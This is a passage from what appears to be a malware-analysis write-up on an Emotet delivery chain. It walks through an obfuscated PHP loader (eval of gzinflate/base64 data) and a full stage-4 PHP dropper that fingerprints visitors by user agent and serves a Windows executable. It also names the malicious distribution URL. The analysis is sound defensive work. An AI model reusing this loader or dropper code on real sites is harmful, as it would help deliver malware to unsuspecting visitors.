<p><a name ="stage-3-the-wrongly-configured-website"></a></p>
<h2><a href="#stage-3-the-wrongly-configured-website">Stage 3 &#8211; The wrongly configured website</a></h2>
<p>Generally, the visited site simply returns the payload. In this case, a wrongly configured website was found, which let the site function as an open directory instead. The PHP file that is analysed in this stage, and the result of it (stage 4), are generally left unobserved, as it is server sided code. The wrongly configured website is given below, although it is now unavailable.</p>
<pre>
http://adsuide.club/y77QTKhV/
</pre>
<p>The content of the PHP file was beautified to increase the readability. Note that the payload is omitted here due to its length, namely 196 393 characters. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">&lt;?php</span>
&nbsp;
<span class="kw2">function</span> fn5c62c1bcb819b<span class="br0">&#40;</span><span class="re0">$s</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="re0">$x</span> <span class="sy0">=</span> <span class="st_h">''</span><span class="sy0">;</span>
	<span class="kw1">for</span> <span class="br0">&#40;</span><span class="re0">$i</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="re0">$n</span> <span class="sy0">=</span> <span class="kw3">strlen</span><span class="br0">&#40;</span><span class="re0">$s</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="re0">$i</span> <span class="sy0">&lt;</span> <span class="re0">$n</span><span class="sy0">;</span> <span class="re0">$i</span><span class="sy0">+=</span> <span class="nu0">2</span><span class="br0">&#41;</span>
		<span class="br0">&#123;</span>
		<span class="re0">$x</span><span class="sy0">.=</span> <span class="kw3">pack</span><span class="br0">&#40;</span><span class="st_h">'H*'</span><span class="sy0">,</span> <span class="kw3">substr</span><span class="br0">&#40;</span><span class="re0">$s</span><span class="sy0">,</span> <span class="re0">$i</span><span class="sy0">,</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="br0">&#125;</span>
&nbsp;
	<span class="kw1">return</span> <span class="re0">$x</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="re0">$n5c62c1bcb81d1</span> <span class="sy0">=</span> fn5c62c1bcb819b<span class="br0">&#40;</span><span class="st_h">'6576616c28677a696e666c617465286261736536345f6465636f64652822'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="re0">$n5c62c1bcb8206</span> <span class="sy0">=</span> fn5c62c1bcb819b<span class="br0">&#40;</span><span class="st_h">'222929293b'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">eval</span><span class="br0">&#40;</span><span class="re0">$n5c62c1bcb81d1</span> <span class="sy0">.</span> <span class="st_h">'[omitted due to size]'</span> <span class="sy0">.</span> <span class="re0">$n5c62c1bcb8206</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The function <em>fn5c62c1bcb819b</em> is used to transform two strings using the <a href="https://secure.php.net/manual/en/function.pack.php">pack function</a> from PHP. The <em>H</em> is used to provide information about the string type, in this case hexadecimal with the high nibble first. The asterisk is used to indicate that the whole string should be taken into account. The function can therefore be refactored to <em>decode</em>.</p>
<p>The variables <em>$n5c62c1bcb81d1</em> and <em>$n5c62c1bcb8206</em> are equal to the result of the <em>decode</em> function. Decoding both strings provides provides more information. In the code below, the <em>[base64-encoded-value-here]</em> is where the payload originally resided.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw3">eval</span><span class="br0">&#40;</span><span class="kw3">gzinflate</span><span class="br0">&#40;</span><span class="kw3">base64_decode</span><span class="br0">&#40;</span><span class="st0">&quot;[base64-encoded-value-here]&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The data is encoded in two ways, meaning it should be decoded before it can be executed. The complete function is given below. Note that the <em><a href="https://secure.php.net/manual/en/function.eval.php">eval</a></em> function call has been removed, since the payload shouldn&#8217;t be executed. Instead, it has been replaced with <em><a href="https://secure.php.net/manual/en/function.file-put-contents.php">file_put_contents</a></em> to save the file for a more detailed analysis. The path that has been used, should be absolute.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">&lt;?php</span>
&nbsp;
<span class="kw2">function</span> decode<span class="br0">&#40;</span><span class="re0">$stringToDecode</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="re0">$output</span> <span class="sy0">=</span> <span class="st_h">''</span><span class="sy0">;</span>
	<span class="kw1">for</span> <span class="br0">&#40;</span><span class="re0">$i</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="re0">$n</span> <span class="sy0">=</span> <span class="kw3">strlen</span><span class="br0">&#40;</span><span class="re0">$stringToDecode</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="re0">$i</span> <span class="sy0">&lt;</span> <span class="re0">$n</span><span class="sy0">;</span> <span class="re0">$i</span><span class="sy0">+=</span> <span class="nu0">2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
		<span class="re0">$output</span><span class="sy0">.=</span> <span class="kw3">pack</span><span class="br0">&#40;</span><span class="st_h">'H*'</span><span class="sy0">,</span> <span class="kw3">substr</span><span class="br0">&#40;</span><span class="re0">$stringToDecode</span><span class="sy0">,</span> <span class="re0">$i</span><span class="sy0">,</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
&nbsp;
	<span class="kw1">return</span> <span class="re0">$output</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="re0">$commandPart1</span> <span class="sy0">=</span> decode<span class="br0">&#40;</span><span class="st_h">'6576616c28677a696e666c617465286261736536345f6465636f64652822'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="re0">$commandPart2</span> <span class="sy0">=</span> decode<span class="br0">&#40;</span><span class="st_h">'222929293b'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">echo</span> <span class="st0">&quot;Command equals:<span class="es1">\n</span>&quot;</span><span class="sy0">;</span>
<span class="kw1">echo</span> <span class="re0">$commandPart1</span> <span class="sy0">.</span> <span class="st0">&quot;[base64-encoded-value-here]&quot;</span> <span class="sy0">.</span> <span class="re0">$commandPart2</span> <span class="sy0">.</span> <span class="st0">&quot;<span class="es1">\n</span>&quot;</span><span class="sy0">;</span>
&nbsp;
<span class="kw3">file_put_contents</span><span class="br0">&#40;</span><span class="st0">&quot;/home/libra/Desktop/emotet/stage4.php&quot;</span><span class="sy0">,</span> <span class="br0">&#40;</span><span class="kw3">gzinflate</span><span class="br0">&#40;</span><span class="kw3">base64_decode</span><span class="br0">&#40;</span><span class="st_h">'[omitted due to size]'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Note that the file that is written to the disk is a PHP file, since the <em><a href="https://secure.php.net/manual/en/function.eval.php">eval</a></em> function executes the given string as PHP code.</p>
<p><a name ="stage-4-returning-the-payload"></a></p>
<h2><a href="#stage-4-returning-the-payload">Stage 4 &#8211; Returning the payload</a></h2>
<p>The complete beautified PHP file is given below. To retain readability, it will be analysed in parts.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">&lt;?php</span>
<span class="kw3">error_reporting</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">set_time_limit</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">ini_set</span><span class="br0">&#40;</span><span class="st_h">'max_execution_time'</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">ini_set</span><span class="br0">&#40;</span><span class="st_h">'memory_limit'</span><span class="sy0">,</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Expires: Tue, 01 Jan 1970 00:00:00 GMT'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Last-Modified: '</span> <span class="sy0">.</span> <span class="kw3">gmdate</span><span class="br0">&#40;</span><span class="st_h">'D, d M Y H:i:s'</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st_h">' GMT'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Cache-Control: no-store, no-cache, must-revalidate, max-age=0'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Cache-Control: post-check=0, pre-check=0'</span><span class="sy0">,</span> <span class="kw4">false</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Pragma: no-cache'</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">function_exists</span><span class="br0">&#40;</span><span class="st_h">'opcache_invalidate'</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	opcache_invalidate<span class="br0">&#40;</span><span class="kw4">__FILE__</span><span class="sy0">,</span> <span class="kw4">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw2">class</span> O
&nbsp;
<span class="br0">&#123;</span>
	<span class="kw2">private</span> <span class="re0">$content_</span> <span class="sy0">=</span> <span class="st_h">'[omitted due to size]'</span><span class="sy0">;</span>
	<span class="kw2">private</span> <span class="re0">$contentName_</span> <span class="sy0">=</span> <span class="st_h">'iMDbapCVgUb.exe'</span><span class="sy0">;</span>
	<span class="kw2">private</span> <span class="re0">$contentType_</span> <span class="sy0">=</span> <span class="st_h">'application/octet-stream'</span><span class="sy0">;</span>
	<span class="kw2">private</span> <span class="re0">$regex_</span> <span class="sy0">=</span> <span class="kw3">array</span><span class="br0">&#40;</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'(?:(?:Orca-)?Android|Adr)[ /](?:[a-z]+ )?(\\d+[\\.\\d]+)'</span><span class="sy0">,</span>
			<span class="st_h">'Android|Silk-Accelerated=[a-z]{4,5}
'</span><span class="sy0">,</span>
			<span class="st_h">'BeyondPod|AntennaPod|Podkicker|DoggCatcher|Player FM|okhttp|Podcatcher Deluxe'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CFNetwork/758\\.4\\.3'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.3\\.15'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.2\\.[78]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.1\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.0\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.5\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.4\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.3\\.18'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.2\\.23'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.1\\.1[26]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.0\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/672\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/672\\.0'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/609\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/60[29]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/548\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/548\\.0'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.13'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.12'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.10'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/467\\.12'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/459'</span><span class="sy0">,</span>
			<span class="st_h">'(?:CPU OS|iPh(?:one)?[ _]OS|iOS)[ _/](\\d+(?:[_\\.]\\d+)*)'</span><span class="sy0">,</span>
			<span class="st_h">'(?:Apple-)?(?:iPhone|iPad|iPod)(?:.*Mac OS X.*Version/(\\d+\\.\\d+)|;
 Opera)?'</span><span class="sy0">,</span>
			<span class="st_h">'Podcasts/(?:[\\d\\.]+)|Instacast(?:HD)?/(?:\\d\\.[\\d\\.abc]+)|Pocket Casts, iOS|Overcast|Castro|Podcat|i[cC]atcher'</span><span class="sy0">,</span>
			<span class="st_h">'iTunes-(iPod|iPad|iPhone)/(?:[\\d\\.]+)'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'Maemo'</span><span class="sy0">,</span>
			<span class="st_h">'Arch ?Linux(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'VectorLinux(?: package)?(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Linux;
 .*((?:Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red Hat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack))[ /](\\d+[\\.\\d]+)'</span><span class="sy0">,</span>
			<span class="st_h">'(Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red Hat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack)(?:(?: Enterprise)? Linux)?(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Linux(?:OS)?[^a-z]'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CFNetwork/760'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/720'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/673'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/596'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/520'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/454'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/(?:438|422|339|330|221|220|217)'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/12[89]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/1\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/1\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'Mac OS X(?: (?:Version )?(\\d+(?:[_\\.]\\d+)+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Mac (\\d+(?:[_\\.]\\d+)+)'</span><span class="sy0">,</span>
			<span class="st_h">'Darwin|Macintosh|Mac_PowerPC|PPC|Mac PowerPC|iMac|MacBook'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CYGWIN_NT-10.0|Windows NT 10.0|Windows 10'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.4|Windows NT 6.4|Windows 10'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.3|Windows NT 6.3|Windows 8.1'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.2|Windows NT 6.2|Windows 8'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.1|Windows NT 6.1|Windows 7'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.0|Windows NT 6.0|Windows Vista'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-5.2|Windows NT 5.2|Windows Server 2003 / XP x64'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-5.1|Windows NT 5.1|Windows XP'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'.?'</span>
		<span class="br0">&#41;</span>
	<span class="br0">&#41;</span><span class="sy0">;</span>
	<span class="kw2">private</span>	<span class="kw2">function</span> spabbd98<span class="br0">&#40;</span><span class="re0">$sp1bd672</span><span class="br0">&#41;</span>
	<span class="br0">&#123;</span>
		<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">regex_</span> <span class="kw1">as</span> <span class="re0">$spda961f</span> <span class="sy0">=&gt;</span> <span class="re0">$spd59ff0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
			<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$spd59ff0</span> <span class="kw1">as</span> <span class="re0">$sp439cf2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
				<span class="re0">$sp439cf2</span> <span class="sy0">=</span> <span class="st_h">'/(?:^|[^A-Z_-])(?:'</span> <span class="sy0">.</span> <span class="kw3">str_replace</span><span class="br0">&#40;</span><span class="st_h">'/'</span><span class="sy0">,</span> <span class="st_h">'\\/'</span><span class="sy0">,</span> <span class="re0">$sp439cf2</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st_h">')/i'</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">preg_match</span><span class="br0">&#40;</span><span class="re0">$sp439cf2</span><span class="sy0">,</span> <span class="re0">$sp1bd672</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="kw1">return</span> <span class="re0">$spda961f</span><span class="sy0">;</span>
				<span class="br0">&#125;</span>
			<span class="br0">&#125;</span>
		<span class="br0">&#125;</span>
&nbsp;
		<span class="kw1">return</span> <span class="sy0">-</span><span class="nu0">1</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
&nbsp;
	<span class="kw2">public</span> <span class="kw2">function</span> execute<span class="br0">&#40;</span><span class="br0">&#41;</span>
	<span class="br0">&#123;</span>
		<span class="re0">$sp1cb870</span> <span class="sy0">=</span> <span class="st_h">'.'</span> <span class="sy0">.</span> <span class="kw3">sha1</span><span class="br0">&#40;</span><span class="kw3">basename</span><span class="br0">&#40;</span><span class="kw3">dirname</span><span class="br0">&#40;</span><span class="kw4">__FILE__</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">touch</span><span class="br0">&#40;</span><span class="re0">$sp1cb870</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="re0">$spdfc158</span> <span class="sy0">=</span> <span class="kw3">fopen</span><span class="br0">&#40;</span><span class="re0">$sp1cb870</span><span class="sy0">,</span> <span class="st_h">'r+'</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$spdfc158</span> <span class="sy0">!==</span> <span class="kw4">false</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
			<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">flock</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="sy0">,</span> LOCK_EX<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
				<span class="re0">$sp7c7c2a</span> <span class="sy0">=</span> <span class="kw3">array</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="re0">$spe8c644</span> <span class="sy0">=</span> <span class="kw3">filesize</span><span class="br0">&#40;</span><span class="re0">$sp1cb870</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$spe8c644</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="re0">$sp7c7c2a</span> <span class="sy0">=</span> <span class="kw3">json_decode</span><span class="br0">&#40;</span><span class="kw3">fread</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="sy0">,</span> <span class="re0">$spe8c644</span><span class="br0">&#41;</span> <span class="sy0">,</span> <span class="kw4">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="br0">&#125;</span>
&nbsp;
				<span class="re0">$sp6345e2</span> <span class="sy0">=</span> <span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'HTTP_USER_AGENT'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> ? <span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'HTTP_USER_AGENT'</span><span class="br0">&#93;</span> <span class="sy0">:</span> <span class="st_h">''</span><span class="sy0">;</span>
				<span class="re0">$spda961f</span> <span class="sy0">=</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">spabbd98</span><span class="br0">&#40;</span><span class="re0">$sp6345e2</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$spda961f</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span><span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$sp7c7c2a</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="sy0">||</span> <span class="sy0">!</span><span class="kw3">is_int</span><span class="br0">&#40;</span><span class="re0">$sp7c7c2a</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
						<span class="re0">$sp7c7c2a</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
					<span class="br0">&#125;</span>
&nbsp;
					<span class="re0">$sp7c7c2a</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="sy0">++;</span>
				<span class="br0">&#125;</span>
&nbsp;
				<span class="kw3">fseek</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw3">fwrite</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="sy0">,</span> <span class="kw3">json_encode</span><span class="br0">&#40;</span><span class="re0">$sp7c7c2a</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw3">fflush</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw3">flock</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="sy0">,</span> LOCK_UN<span class="br0">&#41;</span><span class="sy0">;</span>
			<span class="br0">&#125;</span>
&nbsp;
			<span class="kw3">fclose</span><span class="br0">&#40;</span><span class="re0">$spdfc158</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="br0">&#125;</span>
&nbsp;
		<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Type: '</span> <span class="sy0">.</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">contentType_</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Disposition: attachment;
 filename=&quot;'</span> <span class="sy0">.</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">contentName_</span> <span class="sy0">.</span> <span class="st_h">'&quot;'</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Transfer-Encoding: binary'</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw1">return</span> <span class="kw3">base64_decode</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">content_</span><span class="br0">&#41;</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'QUERY_STRING'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw3">die</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'QUERY_STRING'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'REQUEST_METHOD'</span><span class="br0">&#93;</span> <span class="sy0">!=</span> <span class="st_h">'GET'</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw3">die</span><span class="br0">&#40;</span><span class="kw3">uniqid</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="re0">$sp58859d</span> <span class="sy0">=</span> <span class="kw2">new</span> O<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">echo</span> <span class="re0">$sp58859d</span><span class="sy0">-&gt;</span><span class="me1">execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The first observation that can be made is the separation of the checks that are executed based on the visitor&#8217;s request and the payload that is decoded. At first, the checks are analysed. After that, the code that decodes the payload is analysed.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">&lt;?php</span>
<span class="kw3">error_reporting</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">set_time_limit</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">ini_set</span><span class="br0">&#40;</span><span class="st_h">'max_execution_time'</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">ini_set</span><span class="br0">&#40;</span><span class="st_h">'memory_limit'</span><span class="sy0">,</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Expires: Tue, 01 Jan 1970 00:00:00 GMT'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Last-Modified: '</span> <span class="sy0">.</span> <span class="kw3">gmdate</span><span class="br0">&#40;</span><span class="st_h">'D, d M Y H:i:s'</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st_h">' GMT'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Cache-Control: no-store, no-cache, must-revalidate, max-age=0'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Cache-Control: post-check=0, pre-check=0'</span><span class="sy0">,</span> <span class="kw4">false</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Pragma: no-cache'</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">function_exists</span><span class="br0">&#40;</span><span class="st_h">'opcache_invalidate'</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	opcache_invalidate<span class="br0">&#40;</span><span class="kw4">__FILE__</span><span class="sy0">,</span> <span class="kw4">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The function <em><a href="https://secure.php.net/manual/en/function.error-reporting.php">error_reporting</a></em> sets which errors are reported. The argument, in this case the value <em>0</em>, ensures that no reporting takes place.</p>
<p>To avoid timing out, the function <em><a href="https://secure.php.net/manual/en/function.set-time-limit.php">set_time_limit</a></em> is set to an unlimited amount of time, by using the value <em>0</em>.</p>
